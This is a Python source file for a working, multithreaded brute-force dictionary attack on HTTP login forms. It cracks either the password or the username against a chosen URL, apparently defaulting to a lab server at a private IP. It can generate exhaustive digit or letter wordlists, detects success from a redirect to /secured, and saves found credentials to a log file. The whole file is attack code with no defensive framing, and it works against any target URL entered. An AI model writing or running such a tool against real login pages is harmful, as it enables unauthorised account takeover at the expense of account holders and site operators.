import requests
import threading
from queue import Queue
from tqdm import tqdm
import time
import keyboard
from itertools import product
import string
import os
import tempfile


def get_user_input():
    """
    Get user configuration for the attack: mode, known value, URL, dictionary source, thread count.
    """
    print("Brute Force Dictionary Attack Tool")

    mode = input("Choose mode [pass/user] (pass = crack password, user = crack username): ").strip().lower()
    while mode not in ['pass', 'user']:
        mode = input("Invalid input. Please enter 'pass' or 'user': ").strip().lower()

    known = input(f"Enter the known {'username' if mode == 'pass' else 'password'}: ").strip()

    default_url = "http://172.20.10.3:5000/login"
    url_input = input(f"Enter the target login URL or press Enter to use default [{default_url}]: ").strip()
    url = url_input if url_input else default_url

    auto_gen = input("Do you want to auto-generate the dictionary? [y/n]: ").strip().lower()
    while auto_gen not in ['y', 'n']:
        auto_gen = input("Invalid input. Enter 'y' or 'n': ").strip().lower()

    if auto_gen == 'y':
        minlen = int(input("Minimum length to generate: "))
        maxlen = int(input("Maximum length to generate: "))
        dict_file = generate_dictionary_file(mode, minlen, maxlen)
        print(f"[*] Dictionary generated and saved to: {dict_file}")
    else:
        dict_file = input("Enter path to dictionary file (one guess per line): ").strip()

    threads = int(input("Number of threads to use: "))

    return mode, known, url, dict_file, threads


def generate_dictionary_file(mode, minlen, maxlen):
    """
    Auto-generate a dictionary file based on charset and length range.
    - Digits for password cracking
    - Lowercase letters for username cracking
    """
    charset = string.digits if mode == 'pass' else string.ascii_lowercase
    temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=".txt", mode='w', encoding='utf-8')
    total = 0
    print("[*] Generating dictionary, please wait...")
    for length in range(minlen, maxlen + 1):
        for item in product(charset, repeat=length):
            word = ''.join(item)
            temp_file.write(word + "\n")
            total += 1
    temp_file.close()
    print(f"[*] Generated {total} entries.")
    return temp_file.name


def load_dictionary(file_path):
    """
    Load guesses from a file into a list, one guess per line.
    """
    guesses = []
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            guesses = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Dictionary file '{file_path}' not found.")
    return guesses


def brute_force_worker(queue, mode, fixed_value, target_url, found_event, pbar, lock):
    """
    Worker thread function to process guesses from the queue and send login attempts.
    """
    session = requests.Session()
    while not queue.empty() and not found_event.is_set():
        guess = queue.get()
        if mode == "user":
            payload = {"username": guess, "password": fixed_value}
        else:
            payload = {"username": fixed_value, "password": guess}

        try:
            # Send POST request to target login endpoint
            response = session.post(target_url, data=payload, timeout=1, allow_redirects=False)

            with lock:
                pbar.update(1)

            # Success detection: HTTP 302 redirect to /secured
            if response.status_code == 302 and "/secured" in response.headers.get("Location", ""):
                found_event.set()
                print(f"\n[SUCCESS] Username: {payload['username']}, Password: {payload['password']}")
                with open("success_log.txt", "w") as f:
                    f.write(f"Username: {payload['username']}\nPassword: {payload['password']}\n")
                break
        except:
            continue


def listen_for_exit_key(found_event):
    """
    Monitor for 'Delete' key press to allow user interruption of the attack.
    """
    print("[*] Press 'Delete' key at any time to stop brute force.")
    keyboard.wait('delete')
    if not found_event.is_set():
        print("\n[!] 'Delete' key pressed. Stopping attack...")
        found_event.set()


def main():
    """
    Main function: prepare inputs, start worker threads, and handle result output.
    """
    start = time.time()
    mode, known_value, target_url, dict_file, threads = get_user_input()

    # Check if target host is reachable
    print("[*] Checking if target is reachable...")
    try:
        test = requests.get(target_url.split('/login')[0], timeout=5)
        if test.status_code >= 400:
            print("[!] Warning: Target URL responded with error code.")
    except:
        print("[!] Warning: Target not reachable. Check URL or server.")
        return

    # Load dictionary guesses
    print(f"[*] Loading guesses from '{dict_file}'...")
    guess_list = load_dictionary(dict_file)
    if not guess_list:
        print("[!] No valid entries found in dictionary file.")
        return

    # Prepare queue and shared objects
    queue = Queue()
    for guess in guess_list:
        queue.put(guess)

    found = threading.Event()
    lock = threading.Lock()
    pbar = tqdm(total=queue.qsize())

    # Start brute-force threads
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(
            target=brute_force_worker,
            args=(queue, mode, known_value, target_url, found, pbar, lock)
        )
        t.daemon = True
        t.start()
        thread_list.append(t)

    # Start keypress listener thread
    exit_listener = threading.Thread(target=listen_for_exit_key, args=(found,))
    exit_listener.daemon = True
    exit_listener.start()

    for t in thread_list:
        t.join()

    pbar.close()

    if not found.is_set():
        print("[Fail] No valid credentials found.")
    else:
        print("[Success] info saved to success_log.txt")

    # Delete temp dictionary file if generated
    if dict_file.startswith(tempfile.gettempdir()):
        os.remove(dict_file)
        print(f"[*] Temp dictionary file '{dict_file}' deleted.")

    print(f"[*] Finished in {time.time() - start:.2f} seconds.")


if __name__ == "__main__":
    main()
